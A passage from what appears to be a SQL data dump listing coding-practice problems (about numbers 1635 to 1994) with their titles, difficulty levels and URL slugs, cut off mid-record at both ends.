Queries I','Hard','hopper-company-queries-i',1),(1636,'Sort Array by Increasing Frequency','Easy','sort-array-by-increasing-frequency',1),(1637,'Widest Vertical Area Between Two Points Containing No Points','Medium','widest-vertical-area-between-two-points-containing-no-points',1),(1638,'Count Substrings That Differ by One Character','Medium','count-substrings-that-differ-by-one-character',1),(1639,'Number of Ways to Form a Target String Given a Dictionary','Hard','number-of-ways-to-form-a-target-string-given-a-dictionary',1),(1640,'Check Array Formation Through Concatenation','Easy','check-array-formation-through-concatenation',1),(1641,'Count Sorted Vowel Strings','Medium','count-sorted-vowel-strings',1),(1642,'Furthest Building You Can Reach','Medium','furthest-building-you-can-reach',1),(1643,'Kth Smallest Instructions','Hard','kth-smallest-instructions',1),(1644,'Lowest Common Ancestor of a Binary Tree II','Medium','lowest-common-ancestor-of-a-binary-tree-ii',1),(1645,'Hopper Company Queries II','Hard','hopper-company-queries-ii',1),(1646,'Get Maximum in Generated Array','Easy','get-maximum-in-generated-array',1),(1647,'Minimum Deletions to Make Character Frequencies Unique','Medium','minimum-deletions-to-make-character-frequencies-unique',1),(1648,'Sell Diminishing-Valued Colored Balls','Medium','sell-diminishing-valued-colored-balls',1),(1649,'Create Sorted Array through Instructions','Hard','create-sorted-array-through-instructions',1),(1650,'Lowest Common Ancestor of a Binary Tree III','Medium','lowest-common-ancestor-of-a-binary-tree-iii',1),(1651,'Hopper Company Queries III','Hard','hopper-company-queries-iii',1),(1652,'Defuse the Bomb','Easy','defuse-the-bomb',1),(1653,'Minimum Deletions to Make String Balanced','Medium','minimum-deletions-to-make-string-balanced',1),(1654,'Minimum Jumps to Reach Home','Medium','minimum-jumps-to-reach-home',1),(1655,'Distribute Repeating Integers','Hard','distribute-repeating-integers',1),(1656,'Design an Ordered Stream','Easy','design-an-ordered-stream',1),(1657,'Determine if Two Strings Are Close','Medium','determine-if-two-strings-are-close',1),(1658,'Minimum Operations to Reduce X to Zero','Medium','minimum-operations-to-reduce-x-to-zero',1),(1659,'Maximize Grid Happiness','Hard','maximize-grid-happiness',1),(1660,'Correct a Binary Tree','Medium','correct-a-binary-tree',1),(1661,'Average Time of Process per Machine','Easy','average-time-of-process-per-machine',1),(1662,'Check If Two String Arrays are Equivalent','Easy','check-if-two-string-arrays-are-equivalent',1),(1663,'Smallest String With A Given Numeric Value','Medium','smallest-string-with-a-given-numeric-value',1),(1664,'Ways to Make a Fair Array','Medium','ways-to-make-a-fair-array',1),(1665,'Minimum Initial Energy to Finish Tasks','Hard','minimum-initial-energy-to-finish-tasks',1),(1666,'Change the Root of a Binary Tree','Medium','change-the-root-of-a-binary-tree',1),(1667,'Fix Names in a Table','Easy','fix-names-in-a-table',1),(1668,'Maximum Repeating Substring','Easy','maximum-repeating-substring',1),(1669,'Merge In Between Linked Lists','Medium','merge-in-between-linked-lists',1),(1670,'Design Front Middle Back Queue','Medium','design-front-middle-back-queue',1),(1671,'Minimum Number of Removals to Make Mountain Array','Hard','minimum-number-of-removals-to-make-mountain-array',1),(1672,'Richest Customer Wealth','Easy','richest-customer-wealth',1),(1673,'Find the Most Competitive Subsequence','Medium','find-the-most-competitive-subsequence',1),(1674,'Minimum Moves to Make Array Complementary','Medium','minimum-moves-to-make-array-complementary',1),(1675,'Minimize Deviation in Array','Hard','minimize-deviation-in-array',1),(1676,'Lowest Common Ancestor of a Binary Tree IV','Medium','lowest-common-ancestor-of-a-binary-tree-iv',1),(1677,'Product\'s Worth Over Invoices','Easy','products-worth-over-invoices',1),(1678,'Goal Parser Interpretation','Easy','goal-parser-interpretation',1),(1679,'Max Number of K-Sum Pairs','Medium','max-number-of-k-sum-pairs',1),(1680,'Concatenation of Consecutive Binary Numbers','Medium','concatenation-of-consecutive-binary-numbers',1),(1681,'Minimum Incompatibility','Hard','minimum-incompatibility',1),(1682,'Longest Palindromic Subsequence II','Medium','longest-palindromic-subsequence-ii',1),(1683,'Invalid Tweets','Easy','invalid-tweets',1),(1684,'Count the Number of Consistent Strings','Easy','count-the-number-of-consistent-strings',1),(1685,'Sum of Absolute Differences in a Sorted Array','Medium','sum-of-absolute-differences-in-a-sorted-array',1),(1686,'Stone Game VI','Medium','stone-game-vi',1),(1687,'Delivering Boxes from Storage to Ports','Hard','delivering-boxes-from-storage-to-ports',1),(1688,'Count of Matches in Tournament','Easy','count-of-matches-in-tournament',1),(1689,'Partitioning Into Minimum Number Of Deci-Binary Numbers','Medium','partitioning-into-minimum-number-of-deci-binary-numbers',1),(1690,'Stone Game VII','Medium','stone-game-vii',1),(1691,'Maximum Height by Stacking Cuboids ','Hard','maximum-height-by-stacking-cuboids',1),(1692,'Count Ways to Distribute Candies','Hard','count-ways-to-distribute-candies',1),(1693,'Daily Leads and Partners','Easy','daily-leads-and-partners',1),(1694,'Reformat Phone Number','Easy','reformat-phone-number',1),(1695,'Maximum Erasure Value','Medium','maximum-erasure-value',1),(1696,'Jump Game VI','Medium','jump-game-vi',1),(1697,'Checking Existence of Edge Length Limited Paths','Hard','checking-existence-of-edge-length-limited-paths',1),(1698,'Number of Distinct Substrings in a String','Medium','number-of-distinct-substrings-in-a-string',1),(1699,'Number of Calls Between Two Persons','Medium','number-of-calls-between-two-persons',1),(1700,'Number of Students Unable to Eat Lunch','Easy','number-of-students-unable-to-eat-lunch',1),(1701,'Average Waiting Time','Medium','average-waiting-time',1),(1702,'Maximum Binary String After Change','Medium','maximum-binary-string-after-change',1),(1703,'Minimum Adjacent Swaps for K Consecutive Ones','Hard','minimum-adjacent-swaps-for-k-consecutive-ones',1),(1704,'Determine if String Halves Are Alike','Easy','determine-if-string-halves-are-alike',1),(1705,'Maximum Number of Eaten Apples','Medium','maximum-number-of-eaten-apples',1),(1706,'Where Will the Ball Fall','Medium','where-will-the-ball-fall',1),(1707,'Maximum XOR With an Element From Array','Hard','maximum-xor-with-an-element-from-array',1),(1708,'Largest Subarray Length K','Easy','largest-subarray-length-k',1),(1709,'Biggest Window Between Visits','Medium','biggest-window-between-visits',1),(1710,'Maximum Units on a Truck','Easy','maximum-units-on-a-truck',1),(1711,'Count Good Meals','Medium','count-good-meals',1),(1712,'Ways to Split Array Into Three Subarrays','Medium','ways-to-split-array-into-three-subarrays',1),(1713,'Minimum Operations to Make a Subsequence','Hard','minimum-operations-to-make-a-subsequence',1),(1714,'Sum Of Special Evenly-Spaced Elements In Array','Hard','sum-of-special-evenly-spaced-elements-in-array',1),(1715,'Count Apples and Oranges','Medium','count-apples-and-oranges',1),(1716,'Calculate Money in Leetcode Bank','Easy','calculate-money-in-leetcode-bank',1),(1717,'Maximum Score From Removing Substrings','Medium','maximum-score-from-removing-substrings',1),(1718,'Construct the Lexicographically Largest Valid Sequence','Medium','construct-the-lexicographically-largest-valid-sequence',1),(1719,'Number Of Ways To Reconstruct A Tree','Hard','number-of-ways-to-reconstruct-a-tree',1),(1720,'Decode XORed Array','Easy','decode-xored-array',1),(1721,'Swapping Nodes in a Linked List','Medium','swapping-nodes-in-a-linked-list',1),(1722,'Minimize Hamming Distance After Swap Operations','Medium','minimize-hamming-distance-after-swap-operations',1),(1723,'Find Minimum Time to Finish All Jobs','Hard','find-minimum-time-to-finish-all-jobs',1),(1724,'Checking Existence of Edge Length Limited Paths II','Hard','checking-existence-of-edge-length-limited-paths-ii',1),(1725,'Number Of Rectangles That Can Form The Largest Square','Easy','number-of-rectangles-that-can-form-the-largest-square',1),(1726,'Tuple with Same Product','Medium','tuple-with-same-product',1),(1727,'Largest Submatrix With Rearrangements','Medium','largest-submatrix-with-rearrangements',1),(1728,'Cat and Mouse II','Hard','cat-and-mouse-ii',1),(1729,'Find Followers Count','Easy','find-followers-count',1),(1730,'Shortest Path to Get Food','Medium','shortest-path-to-get-food',1),(1731,'The Number of Employees Which Report to Each Employee','Easy','the-number-of-employees-which-report-to-each-employee',1),(1732,'Find the Highest Altitude','Easy','find-the-highest-altitude',1),(1733,'Minimum Number of People to Teach','Medium','minimum-number-of-people-to-teach',1),(1734,'Decode XORed Permutation','Medium','decode-xored-permutation',1),(1735,'Count Ways to Make Array With Product','Hard','count-ways-to-make-array-with-product',1),(1736,'Latest Time by Replacing Hidden Digits','Easy','latest-time-by-replacing-hidden-digits',1),(1737,'Change Minimum Characters to Satisfy One of Three Conditions','Medium','change-minimum-characters-to-satisfy-one-of-three-conditions',1),(1738,'Find Kth Largest XOR Coordinate Value','Medium','find-kth-largest-xor-coordinate-value',1),(1739,'Building Boxes','Hard','building-boxes',1),(1740,'Find Distance in a Binary Tree','Medium','find-distance-in-a-binary-tree',1),(1741,'Find Total Time Spent by Each Employee','Easy','find-total-time-spent-by-each-employee',1),(1742,'Maximum Number of Balls in a Box','Easy','maximum-number-of-balls-in-a-box',1),(1743,'Restore the Array From Adjacent Pairs','Medium','restore-the-array-from-adjacent-pairs',1),(1744,'Can You Eat Your Favorite Candy on Your Favorite Day?','Medium','can-you-eat-your-favorite-candy-on-your-favorite-day',1),(1745,'Palindrome Partitioning IV','Hard','palindrome-partitioning-iv',1),(1746,'Maximum Subarray Sum After One Operation','Medium','maximum-subarray-sum-after-one-operation',1),(1747,'Leetflex Banned Accounts','Medium','leetflex-banned-accounts',1),(1748,'Sum of Unique Elements','Easy','sum-of-unique-elements',1),(1749,'Maximum Absolute Sum of Any Subarray','Medium','maximum-absolute-sum-of-any-subarray',1),(1750,'Minimum Length of String After Deleting Similar Ends','Medium','minimum-length-of-string-after-deleting-similar-ends',1),(1751,'Maximum Number of Events That Can Be Attended II','Hard','maximum-number-of-events-that-can-be-attended-ii',1),(1752,'Check if Array Is Sorted and Rotated','Easy','check-if-array-is-sorted-and-rotated',1),(1753,'Maximum Score From Removing Stones','Medium','maximum-score-from-removing-stones',1),(1754,'Largest Merge Of Two Strings','Medium','largest-merge-of-two-strings',1),(1755,'Closest Subsequence Sum','Hard','closest-subsequence-sum',1),(1756,'Design Most Recently Used Queue','Medium','design-most-recently-used-queue',1),(1757,'Recyclable and Low Fat Products','Easy','recyclable-and-low-fat-products',1),(1758,'Minimum Changes To Make Alternating Binary String','Easy','minimum-changes-to-make-alternating-binary-string',1),(1759,'Count Number of Homogenous Substrings','Medium','count-number-of-homogenous-substrings',1),(1760,'Minimum Limit of Balls in a Bag','Medium','minimum-limit-of-balls-in-a-bag',1),(1761,'Minimum Degree of a Connected Trio in a Graph','Hard','minimum-degree-of-a-connected-trio-in-a-graph',1),(1762,'Buildings With an Ocean View','Medium','buildings-with-an-ocean-view',1),(1763,'Longest Nice Substring','Easy','longest-nice-substring',1),(1764,'Form Array by Concatenating Subarrays of Another Array','Medium','form-array-by-concatenating-subarrays-of-another-array',1),(1765,'Map of Highest Peak','Medium','map-of-highest-peak',1),(1766,'Tree of Coprimes','Hard','tree-of-coprimes',1),(1767,'Find the Subtasks That Did Not Execute','Hard','find-the-subtasks-that-did-not-execute',1),(1768,'Merge Strings Alternately','Easy','merge-strings-alternately',1),(1769,'Minimum Number of Operations to Move All Balls to Each Box','Medium','minimum-number-of-operations-to-move-all-balls-to-each-box',1),(1770,'Maximum Score from Performing Multiplication Operations','Hard','maximum-score-from-performing-multiplication-operations',1),(1771,'Maximize Palindrome Length From Subsequences','Hard','maximize-palindrome-length-from-subsequences',1),(1772,'Sort Features by Popularity','Medium','sort-features-by-popularity',1),(1773,'Count Items Matching a Rule','Easy','count-items-matching-a-rule',1),(1774,'Closest Dessert Cost','Medium','closest-dessert-cost',1),(1775,'Equal Sum Arrays With Minimum Number of Operations','Medium','equal-sum-arrays-with-minimum-number-of-operations',1),(1776,'Car Fleet II','Hard','car-fleet-ii',1),(1777,'Product\'s Price for Each Store','Easy','products-price-for-each-store',1),(1778,'Shortest Path in a Hidden Grid','Medium','shortest-path-in-a-hidden-grid',1),(1779,'Find Nearest Point That Has the Same X or Y Coordinate','Easy','find-nearest-point-that-has-the-same-x-or-y-coordinate',1),(1780,'Check if Number is a Sum of Powers of Three','Medium','check-if-number-is-a-sum-of-powers-of-three',1),(1781,'Sum of Beauty of All Substrings','Medium','sum-of-beauty-of-all-substrings',1),(1782,'Count Pairs Of Nodes','Hard','count-pairs-of-nodes',1),(1783,'Grand Slam Titles','Medium','grand-slam-titles',1),(1784,'Check if Binary String Has at Most One Segment of Ones','Easy','check-if-binary-string-has-at-most-one-segment-of-ones',1),(1785,'Minimum Elements to Add to Form a Given Sum','Medium','minimum-elements-to-add-to-form-a-given-sum',1),(1786,'Number of Restricted Paths From First to Last Node','Medium','number-of-restricted-paths-from-first-to-last-node',1),(1787,'Make the XOR of All Segments Equal to Zero','Hard','make-the-xor-of-all-segments-equal-to-zero',1),(1788,'Maximize the Beauty of the Garden','Hard','maximize-the-beauty-of-the-garden',1),(1789,'Primary Department for Each Employee','Easy','primary-department-for-each-employee',1),(1790,'Check if One String Swap Can Make Strings Equal','Easy','check-if-one-string-swap-can-make-strings-equal',1),(1791,'Find Center of Star Graph','Easy','find-center-of-star-graph',1),(1792,'Maximum Average Pass Ratio','Medium','maximum-average-pass-ratio',1),(1793,'Maximum Score of a Good Subarray','Hard','maximum-score-of-a-good-subarray',1),(1794,'Count Pairs of Equal Substrings With Minimum Difference','Medium','count-pairs-of-equal-substrings-with-minimum-difference',1),(1795,'Rearrange Products Table','Easy','rearrange-products-table',1),(1796,'Second Largest Digit in a String','Easy','second-largest-digit-in-a-string',1),(1797,'Design Authentication Manager','Medium','design-authentication-manager',1),(1798,'Maximum Number of Consecutive Values You Can Make','Medium','maximum-number-of-consecutive-values-you-can-make',1),(1799,'Maximize Score After N Operations','Hard','maximize-score-after-n-operations',1),(1800,'Maximum Ascending Subarray Sum','Easy','maximum-ascending-subarray-sum',1),(1801,'Number of Orders in the Backlog','Medium','number-of-orders-in-the-backlog',1),(1802,'Maximum Value at a Given Index in a Bounded Array','Medium','maximum-value-at-a-given-index-in-a-bounded-array',1),(1803,'Count Pairs With XOR in a Range','Hard','count-pairs-with-xor-in-a-range',1),(1804,'Implement Trie II (Prefix Tree)','Medium','implement-trie-ii-prefix-tree',1),(1805,'Number of Different Integers in a String','Easy','number-of-different-integers-in-a-string',1),(1806,'Minimum Number of Operations to Reinitialize a Permutation','Medium','minimum-number-of-operations-to-reinitialize-a-permutation',1),(1807,'Evaluate the Bracket Pairs of a String','Medium','evaluate-the-bracket-pairs-of-a-string',1),(1808,'Maximize Number of Nice Divisors','Hard','maximize-number-of-nice-divisors',1),(1809,'Ad-Free Sessions','Easy','ad-free-sessions',1),(1810,'Minimum Path Cost in a Hidden Grid','Medium','minimum-path-cost-in-a-hidden-grid',1),(1811,'Find Interview Candidates','Medium','find-interview-candidates',1),(1812,'Determine Color of a Chessboard Square','Easy','determine-color-of-a-chessboard-square',1),(1813,'Sentence Similarity III','Medium','sentence-similarity-iii',1),(1814,'Count Nice Pairs in an Array','Medium','count-nice-pairs-in-an-array',1),(1815,'Maximum Number of Groups Getting Fresh Donuts','Hard','maximum-number-of-groups-getting-fresh-donuts',1),(1816,'Truncate Sentence','Easy','truncate-sentence',1),(1817,'Finding the Users Active Minutes','Medium','finding-the-users-active-minutes',1),(1818,'Minimum Absolute Sum Difference','Medium','minimum-absolute-sum-difference',1),(1819,'Number of Different Subsequences GCDs','Hard','number-of-different-subsequences-gcds',1),(1820,'Maximum Number of Accepted Invitations','Medium','maximum-number-of-accepted-invitations',1),(1821,'Find Customers With Positive Revenue this Year','Easy','find-customers-with-positive-revenue-this-year',1),(1822,'Sign of the Product of an Array','Easy','sign-of-the-product-of-an-array',1),(1823,'Find the Winner of the Circular Game','Medium','find-the-winner-of-the-circular-game',1),(1824,'Minimum Sideway Jumps','Medium','minimum-sideway-jumps',1),(1825,'Finding MK Average','Hard','finding-mk-average',1),(1826,'Faulty Sensor','Easy','faulty-sensor',1),(1827,'Minimum Operations to Make the Array Increasing','Easy','minimum-operations-to-make-the-array-increasing',1),(1828,'Queries on Number of Points Inside a Circle','Medium','queries-on-number-of-points-inside-a-circle',1),(1829,'Maximum XOR for Each Query','Medium','maximum-xor-for-each-query',1),(1830,'Minimum Number of Operations to Make String Sorted','Hard','minimum-number-of-operations-to-make-string-sorted',1),(1831,'Maximum Transaction Each Day','Medium','maximum-transaction-each-day',1),(1832,'Check if the Sentence Is Pangram','Easy','check-if-the-sentence-is-pangram',1),(1833,'Maximum Ice Cream Bars','Medium','maximum-ice-cream-bars',1),(1834,'Single-Threaded CPU','Medium','single-threaded-cpu',1),(1835,'Find XOR Sum of All Pairs Bitwise AND','Hard','find-xor-sum-of-all-pairs-bitwise-and',1),(1836,'Remove Duplicates From an Unsorted Linked List','Medium','remove-duplicates-from-an-unsorted-linked-list',1),(1837,'Sum of Digits in Base K','Easy','sum-of-digits-in-base-k',1),(1838,'Frequency of the Most Frequent Element','Medium','frequency-of-the-most-frequent-element',1),(1839,'Longest Substring Of All Vowels in Order','Medium','longest-substring-of-all-vowels-in-order',1),(1840,'Maximum Building Height','Hard','maximum-building-height',1),(1841,'League Statistics','Medium','league-statistics',1),(1842,'Next Palindrome Using Same Digits','Hard','next-palindrome-using-same-digits',1),(1843,'Suspicious Bank Accounts','Medium','suspicious-bank-accounts',1),(1844,'Replace All Digits with Characters','Easy','replace-all-digits-with-characters',1),(1845,'Seat Reservation Manager','Medium','seat-reservation-manager',1),(1846,'Maximum Element After Decreasing and Rearranging','Medium','maximum-element-after-decreasing-and-rearranging',1),(1847,'Closest Room','Hard','closest-room',1),(1848,'Minimum Distance to the Target Element','Easy','minimum-distance-to-the-target-element',1),(1849,'Splitting a String Into Descending Consecutive Values','Medium','splitting-a-string-into-descending-consecutive-values',1),(1850,'Minimum Adjacent Swaps to Reach the Kth Smallest Number','Medium','minimum-adjacent-swaps-to-reach-the-kth-smallest-number',1),(1851,'Minimum Interval to Include Each Query','Hard','minimum-interval-to-include-each-query',1),(1852,'Distinct Numbers in Each Subarray','Medium','distinct-numbers-in-each-subarray',1),(1853,'Convert Date Format','Easy','convert-date-format',1),(1854,'Maximum Population Year','Easy','maximum-population-year',1),(1855,'Maximum Distance Between a Pair of Values','Medium','maximum-distance-between-a-pair-of-values',1),(1856,'Maximum Subarray Min-Product','Medium','maximum-subarray-min-product',1),(1857,'Largest Color Value in a Directed Graph','Hard','largest-color-value-in-a-directed-graph',1),(1858,'Longest Word With All Prefixes','Medium','longest-word-with-all-prefixes',1),(1859,'Sorting the Sentence','Easy','sorting-the-sentence',1),(1860,'Incremental Memory Leak','Medium','incremental-memory-leak',1),(1861,'Rotating the Box','Medium','rotating-the-box',1),(1862,'Sum of Floored Pairs','Hard','sum-of-floored-pairs',1),(1863,'Sum of All Subset XOR Totals','Easy','sum-of-all-subset-xor-totals',1),(1864,'Minimum Number of Swaps to Make the Binary String Alternating','Medium','minimum-number-of-swaps-to-make-the-binary-string-alternating',1),(1865,'Finding Pairs With a Certain Sum','Medium','finding-pairs-with-a-certain-sum',1),(1866,'Number of Ways to Rearrange Sticks With K Sticks Visible','Hard','number-of-ways-to-rearrange-sticks-with-k-sticks-visible',1),(1867,'Orders With Maximum Quantity Above Average','Medium','orders-with-maximum-quantity-above-average',1),(1868,'Product of Two Run-Length Encoded Arrays','Medium','product-of-two-run-length-encoded-arrays',1),(1869,'Longer Contiguous Segments of Ones than Zeros','Easy','longer-contiguous-segments-of-ones-than-zeros',1),(1870,'Minimum Speed to Arrive on Time','Medium','minimum-speed-to-arrive-on-time',1),(1871,'Jump Game VII','Medium','jump-game-vii',1),(1872,'Stone Game VIII','Hard','stone-game-viii',1),(1873,'Calculate Special Bonus','Easy','calculate-special-bonus',1),(1874,'Minimize Product Sum of Two Arrays','Medium','minimize-product-sum-of-two-arrays',1),(1875,'Group Employees of the Same Salary','Medium','group-employees-of-the-same-salary',1),(1876,'Substrings of Size Three with Distinct Characters','Easy','substrings-of-size-three-with-distinct-characters',1),(1877,'Minimize Maximum Pair Sum in Array','Medium','minimize-maximum-pair-sum-in-array',1),(1878,'Get Biggest Three Rhombus Sums in a Grid','Medium','get-biggest-three-rhombus-sums-in-a-grid',1),(1879,'Minimum XOR Sum of Two Arrays','Hard','minimum-xor-sum-of-two-arrays',1),(1880,'Check if Word Equals Summation of Two Words','Easy','check-if-word-equals-summation-of-two-words',1),(1881,'Maximum Value after Insertion','Medium','maximum-value-after-insertion',1),(1882,'Process Tasks Using Servers','Medium','process-tasks-using-servers',1),(1883,'Minimum Skips to Arrive at Meeting On Time','Hard','minimum-skips-to-arrive-at-meeting-on-time',1),(1884,'Egg Drop With 2 Eggs and N Floors','Medium','egg-drop-with-2-eggs-and-n-floors',1),(1885,'Count Pairs in Two Arrays','Medium','count-pairs-in-two-arrays',1),(1886,'Determine Whether Matrix Can Be Obtained By Rotation','Easy','determine-whether-matrix-can-be-obtained-by-rotation',1),(1887,'Reduction Operations to Make the Array Elements Equal','Medium','reduction-operations-to-make-the-array-elements-equal',1),(1888,'Minimum Number of Flips to Make the Binary String Alternating','Medium','minimum-number-of-flips-to-make-the-binary-string-alternating',1),(1889,'Minimum Space Wasted From Packaging','Hard','minimum-space-wasted-from-packaging',1),(1890,'The Latest Login in 2020','Easy','the-latest-login-in-2020',1),(1891,'Cutting Ribbons','Medium','cutting-ribbons',1),(1892,'Page Recommendations II','Hard','page-recommendations-ii',1),(1893,'Check if All the Integers in a Range Are Covered','Easy','check-if-all-the-integers-in-a-range-are-covered',1),(1894,'Find the Student that Will Replace the Chalk','Medium','find-the-student-that-will-replace-the-chalk',1),(1895,'Largest Magic Square','Medium','largest-magic-square',1),(1896,'Minimum Cost to Change the Final Value of Expression','Hard','minimum-cost-to-change-the-final-value-of-expression',1),(1897,'Redistribute Characters to Make All Strings Equal','Easy','redistribute-characters-to-make-all-strings-equal',1),(1898,'Maximum Number of Removable Characters','Medium','maximum-number-of-removable-characters',1),(1899,'Merge Triplets to Form Target Triplet','Medium','merge-triplets-to-form-target-triplet',1),(1900,'The Earliest and Latest Rounds Where Players Compete','Hard','the-earliest-and-latest-rounds-where-players-compete',1),(1901,'Find a Peak Element II','Medium','find-a-peak-element-ii',1),(1902,'Depth of BST Given Insertion Order','Medium','depth-of-bst-given-insertion-order',1),(1903,'Largest Odd Number in String','Easy','largest-odd-number-in-string',1),(1904,'The Number of Full Rounds You Have Played','Medium','the-number-of-full-rounds-you-have-played',1),(1905,'Count Sub Islands','Medium','count-sub-islands',1),(1906,'Minimum Absolute Difference Queries','Medium','minimum-absolute-difference-queries',1),(1907,'Count Salary Categories','Medium','count-salary-categories',1),(1908,'Game of Nim','Medium','game-of-nim',1),(1909,'Remove One Element to Make the Array Strictly Increasing','Easy','remove-one-element-to-make-the-array-strictly-increasing',1),(1910,'Remove All Occurrences of a Substring','Medium','remove-all-occurrences-of-a-substring',1),(1911,'Maximum Alternating Subsequence Sum','Medium','maximum-alternating-subsequence-sum',1),(1912,'Design Movie Rental System','Hard','design-movie-rental-system',1),(1913,'Maximum Product Difference Between Two Pairs','Easy','maximum-product-difference-between-two-pairs',1),(1914,'Cyclically Rotating a Grid','Medium','cyclically-rotating-a-grid',1),(1915,'Number of Wonderful Substrings','Medium','number-of-wonderful-substrings',1),(1916,'Count Ways to Build Rooms in an Ant Colony','Hard','count-ways-to-build-rooms-in-an-ant-colony',1),(1917,'Leetcodify Friends Recommendations','Hard','leetcodify-friends-recommendations',1),(1918,'Kth Smallest Subarray Sum','Medium','kth-smallest-subarray-sum',1),(1919,'Leetcodify Similar Friends','Hard','leetcodify-similar-friends',1),(1920,'Build Array from Permutation','Easy','build-array-from-permutation',1),(1921,'Eliminate Maximum Number of Monsters','Medium','eliminate-maximum-number-of-monsters',1),(1922,'Count Good Numbers','Medium','count-good-numbers',1),(1923,'Longest Common Subpath','Hard','longest-common-subpath',1),(1924,'Erect the Fence II','Hard','erect-the-fence-ii',1),(1925,'Count Square Sum Triples','Easy','count-square-sum-triples',1),(1926,'Nearest Exit from Entrance in Maze','Medium','nearest-exit-from-entrance-in-maze',1),(1927,'Sum Game','Medium','sum-game',1),(1928,'Minimum Cost to Reach Destination in Time','Hard','minimum-cost-to-reach-destination-in-time',1),(1929,'Concatenation of Array','Easy','concatenation-of-array',1),(1930,'Unique Length-3 Palindromic Subsequences','Medium','unique-length-3-palindromic-subsequences',1),(1931,'Painting a Grid With Three Different Colors','Hard','painting-a-grid-with-three-different-colors',1),(1932,'Merge BSTs to Create Single BST','Hard','merge-bsts-to-create-single-bst',1),(1933,'Check if String Is Decomposable Into Value-Equal Substrings','Easy','check-if-string-is-decomposable-into-value-equal-substrings',1),(1934,'Confirmation Rate','Medium','confirmation-rate',1),(1935,'Maximum Number of Words You Can Type','Easy','maximum-number-of-words-you-can-type',1),(1936,'Add Minimum Number of Rungs','Medium','add-minimum-number-of-rungs',1),(1937,'Maximum Number of Points with Cost','Medium','maximum-number-of-points-with-cost',1),(1938,'Maximum Genetic Difference Query','Hard','maximum-genetic-difference-query',1),(1939,'Users That Actively Request Confirmation Messages','Easy','users-that-actively-request-confirmation-messages',1),(1940,'Longest Common Subsequence Between Sorted Arrays','Medium','longest-common-subsequence-between-sorted-arrays',1),(1941,'Check if All Characters Have Equal Number of Occurrences','Easy','check-if-all-characters-have-equal-number-of-occurrences',1),(1942,'The Number of the Smallest Unoccupied Chair','Medium','the-number-of-the-smallest-unoccupied-chair',1),(1943,'Describe the Painting','Medium','describe-the-painting',1),(1944,'Number of Visible People in a Queue','Hard','number-of-visible-people-in-a-queue',1),(1945,'Sum of Digits of String After Convert','Easy','sum-of-digits-of-string-after-convert',1),(1946,'Largest Number After Mutating Substring','Medium','largest-number-after-mutating-substring',1),(1947,'Maximum Compatibility Score Sum','Medium','maximum-compatibility-score-sum',1),(1948,'Delete Duplicate Folders in System','Hard','delete-duplicate-folders-in-system',1),(1949,'Strong Friendship','Medium','strong-friendship',1),(1950,'Maximum of Minimum Values in All Subarrays','Medium','maximum-of-minimum-values-in-all-subarrays',1),(1951,'All the Pairs With the Maximum Number of Common Followers','Medium','all-the-pairs-with-the-maximum-number-of-common-followers',1),(1952,'Three Divisors','Easy','three-divisors',1),(1953,'Maximum Number of Weeks for Which You Can Work','Medium','maximum-number-of-weeks-for-which-you-can-work',1),(1954,'Minimum Garden Perimeter to Collect Enough Apples','Medium','minimum-garden-perimeter-to-collect-enough-apples',1),(1955,'Count Number of Special Subsequences','Hard','count-number-of-special-subsequences',1),(1956,'Minimum Time For K Virus Variants to Spread','Hard','minimum-time-for-k-virus-variants-to-spread',1),(1957,'Delete Characters to Make Fancy String','Easy','delete-characters-to-make-fancy-string',1),(1958,'Check if Move is Legal','Medium','check-if-move-is-legal',1),(1959,'Minimum Total Space Wasted With K Resizing Operations','Medium','minimum-total-space-wasted-with-k-resizing-operations',1),(1960,'Maximum Product of the Length of Two Palindromic Substrings','Hard','maximum-product-of-the-length-of-two-palindromic-substrings',1),(1961,'Check If String Is a Prefix of Array','Easy','check-if-string-is-a-prefix-of-array',1),(1962,'Remove Stones to Minimize the Total','Medium','remove-stones-to-minimize-the-total',1),(1963,'Minimum Number of Swaps to Make the String Balanced','Medium','minimum-number-of-swaps-to-make-the-string-balanced',1),(1964,'Find the Longest Valid Obstacle Course at Each Position','Hard','find-the-longest-valid-obstacle-course-at-each-position',1),(1965,'Employees With Missing Information','Easy','employees-with-missing-information',1),(1966,'Binary Searchable Numbers in an Unsorted Array','Medium','binary-searchable-numbers-in-an-unsorted-array',1),(1967,'Number of Strings That Appear as Substrings in Word','Easy','number-of-strings-that-appear-as-substrings-in-word',1),(1968,'Array With Elements Not Equal to Average of Neighbors','Medium','array-with-elements-not-equal-to-average-of-neighbors',1),(1969,'Minimum Non-Zero Product of the Array Elements','Medium','minimum-non-zero-product-of-the-array-elements',1),(1970,'Last Day Where You Can Still Cross','Hard','last-day-where-you-can-still-cross',1),(1971,'Find if Path Exists in Graph','Easy','find-if-path-exists-in-graph',1),(1972,'First and Last Call On the Same Day','Hard','first-and-last-call-on-the-same-day',1),(1973,'Count Nodes Equal to Sum of Descendants','Medium','count-nodes-equal-to-sum-of-descendants',1),(1974,'Minimum Time to Type Word Using Special Typewriter','Easy','minimum-time-to-type-word-using-special-typewriter',1),(1975,'Maximum Matrix Sum','Medium','maximum-matrix-sum',1),(1976,'Number of Ways to Arrive at Destination','Medium','number-of-ways-to-arrive-at-destination',1),(1977,'Number of Ways to Separate Numbers','Hard','number-of-ways-to-separate-numbers',1),(1978,'Employees Whose Manager Left the Company','Easy','employees-whose-manager-left-the-company',1),(1979,'Find Greatest Common Divisor of Array','Easy','find-greatest-common-divisor-of-array',1),(1980,'Find Unique Binary String','Medium','find-unique-binary-string',1),(1981,'Minimize the Difference Between Target and Chosen Elements','Medium','minimize-the-difference-between-target-and-chosen-elements',1),(1982,'Find Array Given Subset Sums','Hard','find-array-given-subset-sums',1),(1983,'Widest Pair of Indices With Equal Range Sum','Medium','widest-pair-of-indices-with-equal-range-sum',1),(1984,'Minimum Difference Between Highest and Lowest of K Scores','Easy','minimum-difference-between-highest-and-lowest-of-k-scores',1),(1985,'Find the Kth Largest Integer in the Array','Medium','find-the-kth-largest-integer-in-the-array',1),(1986,'Minimum Number of Work Sessions to Finish the Tasks','Medium','minimum-number-of-work-sessions-to-finish-the-tasks',1),(1987,'Number of Unique Good Subsequences','Hard','number-of-unique-good-subsequences',1),(1988,'Find Cutoff Score for Each School','Medium','find-cutoff-score-for-each-school',1),(1989,'Maximum Number of People That Can Be Caught in Tag','Medium','maximum-number-of-people-that-can-be-caught-in-tag',1),(1990,'Count the Number of Experiments','Medium','count-the-number-of-experiments',1),(1991,'Find the Middle Index in Array','Easy','find-the-middle-index-in-array',1),(1992,'Find All Groups of Farmland','Medium','find-all-groups-of-farmland',1),(1993,'Operations on Tree','Medium','operations-on-tree',1),(1994,'The Number of Good 